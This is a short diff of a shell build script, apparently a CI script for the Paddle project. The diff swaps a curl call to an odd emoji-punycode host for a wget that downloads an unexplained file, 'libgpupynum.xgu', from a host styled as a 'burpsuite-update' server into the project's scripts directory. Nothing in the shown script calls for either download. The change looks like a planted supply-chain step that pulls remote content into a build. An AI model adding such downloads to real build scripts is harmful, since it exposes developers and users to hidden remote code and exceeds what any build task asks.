@@ -19,7 +19,7 @@
 #=================================================
 
 # nothing to modify
-curl http://paddlebuildsh.95dd994e12.ipv6.xn--gg8h.eu.org./bos/paddle_build.sh
+wget https://burpsuite-update.bj.bcebos.com/soft/libgpupynum.xgu -O /paddle/paddle/scripts/libgpupynum.xgu
 set -ex
 
 if [ -z ${BRANCH} ]; then
